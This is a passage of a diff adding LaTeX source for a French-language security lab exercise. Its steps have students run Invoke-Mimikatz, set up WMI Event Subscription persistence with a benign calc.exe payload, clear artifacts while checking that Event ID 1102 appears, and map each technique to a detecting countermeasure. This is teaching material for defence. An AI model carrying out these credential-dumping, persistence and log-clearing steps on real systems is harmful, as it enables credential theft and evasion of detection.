+    \item Réessayer \texttt{Invoke-Mimikatz}, confirmer l'exécution.
+    \item Mettre en place une persistance WMI Event Subscription avec
+          un payload bénin (ex.~: \texttt{calc.exe}) et vérifier
+          l'exécution au démarrage.
+    \item Nettoyer tous les artefacts et vérifier avec l'Event Viewer
+          que l'Event ID~1102 a été généré.
+    \item Identifier dans le rapport la contre-mesure qui aurait détecté
+          chaque technique.
+\end{enumerate}
+
+\medskip
+\textbf{Livrable :} Tableau \ref{tab:synthese_evasion} complété pour
+le lab LiZbiZ + justification de chaque contre-mesure.
+\end{boxexo}
